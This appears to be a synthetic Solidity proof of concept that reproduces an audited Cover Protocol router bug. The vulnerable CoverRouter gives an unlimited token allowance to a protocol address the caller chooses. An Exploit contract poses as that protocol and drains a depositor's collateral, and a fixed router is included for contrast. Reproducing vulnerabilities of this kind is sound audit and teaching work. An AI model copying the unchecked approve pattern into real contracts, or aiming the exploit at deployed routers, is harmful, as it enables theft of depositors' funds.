// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Cover Protocol CoverRouter — unlimited approve to an unchecked protocol
    (MixBytes, Cover Peripheral, 2021-01).
    SYNTHETIC, cheatcode-free. The allowance check is the audited snippet.
    Solidity 0.8 has no uint256(-1); the approve uses the same max uint256.

    addCover returns false, so the depositor's collateral stays on the router
    with an unlimited allowance to the attacker, who then pulls N = 1000. */

contract Collateral {
    string public name = "DAI";
    string public symbol = "DAI";
    uint8 public decimals = 18;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 a = allowance[from][msg.sender];
        if (a != type(uint256).max) allowance[from][msg.sender] = a - amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

interface IProtocol {
    function addCover(uint256 amount) external returns (bool);
}

contract CoverRouter {
    Collateral public token;

    constructor(Collateral token_) {
        token = token_;
    }

    function addCoverAndCreatePools(address _protocol, address _collateral, uint256 _amount) external virtual {
        require(_collateral == address(token), "col");
        token.transferFrom(msg.sender, address(this), _amount);
        _addCover(_protocol, _amount);
    }

    function _addCover(address _protocol, uint256 _amount) internal {
        _forceApprove(token, _protocol, _amount);
        IProtocol(_protocol).addCover(_amount);
    }

    /// Audited helper. No check that _spender is a real protocol.
    function _forceApprove(Collateral _token, address _spender, uint256 _amount) internal {
        if (_token.allowance(address(this), _spender) < _amount) {
            // @> VULN: audited `approve(_spender, uint256(-1))` grants the caller-chosen protocol the whole balance
            _token.approve(_spender, type(uint256).max);
        }
    }
}

contract CoverRouterFixed is CoverRouter {
    address public immutable allowed;

    constructor(Collateral token_, address allowed_) CoverRouter(token_) {
        allowed = allowed_;
    }

    function addCoverAndCreatePools(address _protocol, address _collateral, uint256 _amount) external override {
        require(_protocol == allowed, "protocol");
        require(_collateral == address(token), "col");
        token.transferFrom(msg.sender, address(this), _amount);
        token.approve(_protocol, _amount);
        bool ok = IProtocol(_protocol).addCover(_amount);
        require(ok, "addCover");
        uint256 left = token.balanceOf(address(this));
        if (left != 0) token.transfer(msg.sender, left);
    }
}

contract Depositor {
    Collateral public token;

    constructor(Collateral token_) {
        token = token_;
    }

    function fundAndBuy(CoverRouter router, address protocol, uint256 amount) external {
        token.approve(address(router), amount);
        router.addCoverAndCreatePools(protocol, address(token), amount);
    }
}

contract Exploit is IProtocol {
    uint256 public constant N = 1000 ether;

    Collateral public token; // nonce 1
    CoverRouter public router; // nonce 2
    Depositor public depositor; // nonce 3

    uint256 public stolen;
    uint256 public routerLeft;
    uint256 public depositorLeft;
    uint256 public allowanceToAttacker;

    constructor() {
        token = new Collateral();
        router = new CoverRouter(token);
        depositor = new Depositor(token);
    }

    function addCover(uint256) external pure returns (bool) {
        return false;
    }

    function run() external {
        token.mint(address(depositor), N);
        depositor.fundAndBuy(router, address(this), N);
        allowanceToAttacker = token.allowance(address(router), address(this));
        uint256 sitting = token.balanceOf(address(router));
        token.transferFrom(address(router), address(this), sitting);
        stolen = token.balanceOf(address(this));
        routerLeft = token.balanceOf(address(router));
        depositorLeft = token.balanceOf(address(depositor));
        require(allowanceToAttacker == type(uint256).max, "unlimited");
        require(stolen == N, "stole N");
        require(routerLeft == 0, "router drained");
        require(depositorLeft == 0, "depositor lost N");
    }
}
